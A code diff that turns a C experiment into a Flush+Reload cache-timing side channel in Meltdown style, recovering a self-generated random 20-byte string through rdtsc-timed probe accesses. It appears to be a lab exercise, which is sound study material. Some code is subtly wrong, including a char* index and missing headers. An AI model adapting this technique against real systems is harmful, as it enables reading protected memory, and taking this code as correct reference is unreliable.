@@ -1,10 +1,12 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <x86intrin.h>
+#include <limits.h>
 
 #define REPS_THRES 1000000
+#define REPS_MELT 5
 #define BYTE 256
-#define PAGE_SIZE 4096
+#define OFFSET 4096
 #define CACHE_LINE 64 
 
 char* secret_data;	
@@ -30,64 +32,105 @@ static int64_t rdtsc() {
 }
   
 static int64_t timed_access(void *p, int do_flush, int do_preload) {
+
     if (do_flush) {
         flush(p);
     } else if (do_preload) {
         load(p);
     }
-     
-    uint64_t x = rdtsc();
-    load(p);
-    return rdtsc()-x;
+
+    volatile unsigned long time;
+	asm __volatile__(
+			"  mfence             \n"
+			"  lfence             \n"
+			"  rdtsc              \n"
+			"  lfence             \n"
+			"  movl %%eax, %%esi  \n"
+			"  movl (%1), %%eax   \n"
+			"  lfence             \n"
+			"  rdtsc              \n"
+			"  subl %%esi, %%eax  \n"
+			: "=a"(time)
+			: "c"(p)
+			: "%esi", "%edx");
+	return (int64_t) time;
+
+    // uint64_t x = rdtsc();
+    // load(p);
+    // return rdtsc()-x;
 }
+
+
 static int64_t get_threshold() {
     long int time_flushed = 0;
     long int time_unflushed = 0;
 
     for (int i = 0; i < REPS_THRES; i++)
     {
-        time_flushed += timed_access(probe, 1, 0);
-        time_unflushed += timed_access(probe, 0, 1);
+        time_flushed += timed_access(&probe, 1, 0);
+        time_unflushed += timed_access(&probe, 0, 1);
     }
 
     printf("on average it took this long to call unflushed: %ld\n", time_unflushed/REPS_THRES);
     printf("it took this long to call flushed: %ld\n", time_flushed/REPS_THRES);
     printf("average diff: %ld\n", (time_flushed-time_unflushed)/REPS_THRES);
 
-    return (time_flushed+time_unflushed)/(2*REPS_THRES);
+    return (2*time_flushed+time_unflushed)/(3*REPS_THRES);
 }
 
 
-static char melt_char(void *p, char* probe, int64_t thres) {
-    char c = 0;
-    for (int i = 0; i < BYTE; i++)
-    {
-        flush(probe+i*CACHE_LINE);
-    }
-    // printf("flushed probe array\n");
+static int compare (const void * a, const void * b) {
+   return ( *(int64_t*)a - *(int64_t*)b );
+}
+
+static __attribute__((optimize("-O0"))) char* melt_char(char *p, char* probe, int64_t thres) {
+    char c;
 
     int64_t access_times[BYTE];
+    for(int i = 0; i < BYTE; i++) {
+        access_times[i] = INT64_MAX;
+    }
 
-    char _ = probe[(*(volatile char *)p) * CACHE_LINE];
-    // printf("char: %c\n", *(volatile char *)p);
-
-    for (int i = 0; i < BYTE; i++)
+    for (int j = 0; j < BYTE*OFFSET; j++)
     {
-        access_times[i] = timed_access(probe+i*CACHE_LINE, 0,0);
-        printf("character %c took %ld with thres %ld\n", i, access_times[i], thres);
-        if (access_times[i] < thres) {
-            if (c == 0) {
-                c = i;
-            } 
+        flush(&probe[j]);
+    }
+
+    for(int i = 0; i < REPS_MELT; i++) {
+        for (int j = 0; j < BYTE; j++) {
+            char _ = probe[(*(volatile char *)p) * OFFSET];
+            int64_t tmp = timed_access(&probe[j*OFFSET], 0, 0);
+            if (tmp < thres && tmp != 0 && tmp < access_times[j]) {
+                access_times[j] = tmp;
+            }
+        //    flush(&probe[j*OFFSET]);
+        }
+        for (int j = 0; j < BYTE*OFFSET; j++)
+        {
+            flush(&probe[j]);
+        }
+    } 
+    
+    int64_t min_time = INT64_MAX;
+    char *min_ix;
+
+    for(int i = 0; i < BYTE; i++) {
+        if (min_time > access_times[i]) {
+            min_ix = i;
+            min_time = access_times[i];
         }
     }
-    return c;
+
+    printf("found the following character: %c, %d\n", min_ix, min_ix);
+    return min_ix;
 }
 
 void main()
 {   
     secret_data = malloc(20);
-    probe = malloc(BYTE * CACHE_LINE);
+    probe = malloc(BYTE * OFFSET);
+
+    srand(time(NULL));
     for (int i = 0; i < 20; i++)
     {
         int r =  rand() % 95 + 32; // Get ASCII character in [32,127], i.e. in the range of printable characters
@@ -95,22 +138,18 @@ void main()
     }
     printf("created random printable character array: %s\n", secret_data);
 
-
     int64_t thres = get_threshold();
     printf("computed threshold: %ld\n", thres);
 
 
-    char* recovered_data = malloc(sizeof(secret_data)); 
+    char* recovered_data = malloc(20); 
 
 
-    melt_char(secret_data, probe, thres);
-
-    // for (int i = 0; i < sizeof(secret_data) / sizeof(char); i++)
-    // {
-    //     recovered_data[i] = melt_char(secret_data + i, probe, thres);
-    // }
+    for (int i = 0; i < 20; i++)
+    {
+        recovered_data[i] = melt_char(secret_data + i, probe, thres);
+    }
     
-    printf("got: %s", recovered_data);
-    
+    printf("expected: %s\ngot:%s\n", secret_data, recovered_data);    
 }
 
